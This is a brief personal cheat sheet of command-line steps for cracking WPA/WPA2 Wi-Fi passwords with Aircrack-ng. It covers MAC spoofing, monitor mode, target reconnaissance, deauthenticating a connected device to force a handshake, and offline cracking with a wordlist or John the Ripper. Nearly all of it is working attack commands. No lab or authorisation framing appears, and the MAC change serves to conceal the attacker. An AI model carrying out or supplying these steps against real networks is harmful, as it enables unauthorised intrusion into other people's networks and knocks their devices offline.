// Chris's notes on using the Aircrack-ng suite of tools

# Cracking WPA/WPA2 If All Else Fails (Fern, Wifite, etc...)

# Change your MAC (wifi-switch off)
macchanger -A wlan0

# Enable monitor mode
airmon-ng start wlan0

# Prowl for networks
airodump-ng wlan0mon

# Get more info on target
airodump-ng --bssid 12:..(router)..:34 -c 1 (channel) -w capturefile wlan0mon

# Sniff a handshake
# 1 - wait for [WPA handshake:...
# AND/OR: 2 - 
Wireshark -> wlan0mon -> filter "eapol"
 -> wait for 1,2,3 & 4 from a device on network

# If impatient, deauthenticate a device on the network to generate
# a handshake at-will. Do WITH airodump/wireshark running!
aireplay-ng -0 1 ('1' deauth packet) -a 12:..(router)..:34
	-c 56:..(device)..:78 wlan0mon

# Once a handshake is captured...
# On airodump
CTR-c (to close and save cap file)
# On Wireshark
save-as -> *.cap/*.pcap

# Can exit all networking apps/shells. Rest is offline cracking.

# Offline crack using password file and capture
aircrack-ng -w passwords.txt -b 12:..(router)..:34 ./capture.pcap

# Done!

# Or..not?
# Try piping john into aircrack for a brute-force:
john --incremental --session=cracker --stdout 
| aircrack-ng -b 12:..(router)..:34 ~/capture.cap -w -

# Restore the session:
john --restore=cracker 
| aircrack-ng -b 12:..(router)..:34 ~/capture.cap -w -
